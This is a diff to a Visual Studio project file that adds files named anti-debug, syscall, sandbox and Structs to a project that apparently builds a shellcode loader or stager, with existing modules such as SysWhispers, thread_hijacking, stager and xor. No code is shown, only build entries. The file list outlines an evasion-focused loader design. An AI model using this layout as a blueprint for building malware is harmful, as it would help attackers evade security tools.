@@ -133,9 +133,11 @@
     </Link>
   </ItemDefinitionGroup>
   <ItemGroup>
+    <ClCompile Include="src\anti-debug.c" />
     <ClCompile Include="src\crypt.c" />
     <ClCompile Include="src\custom.c" />
     <ClCompile Include="src\debug.c" />
+    <ClCompile Include="src\syscall.c" />
     <ClCompile Include="src\SysWhispers.c" />
     <ClCompile Include="src\thread_hijacking.c" />
     <ClCompile Include="src\loader.c" />
@@ -145,10 +147,12 @@
     <ClCompile Include="src\registry.c" />
     <ClCompile Include="src\util.c" />
     <ClCompile Include="src\uuid.c" />
+    <ClCompile Include="src\sandbox.c" />
     <ClCompile Include="src\web.c" />
     <ClCompile Include="src\xor.c" />
   </ItemGroup>
   <ItemGroup>
+    <ClInclude Include="include\anti-debug.h" />
     <ClInclude Include="include\crypt.h" />
     <ClInclude Include="include\custom.h" />
     <ClInclude Include="include\customStruct.h" />
@@ -161,8 +165,11 @@
     <ClInclude Include="include\process.h" />
     <ClInclude Include="include\customp.hpp" />
     <ClInclude Include="include\stager.h" />
+    <ClInclude Include="include\Structs.h" />
+    <ClInclude Include="include\syscall.h" />
     <ClInclude Include="include\SysWhispers.h" />
     <ClInclude Include="include\threads.h" />
+    <ClInclude Include="include\sandbox.h" />
     <ClInclude Include="src\Structs.h" />
   </ItemGroup>
   <ItemGroup>
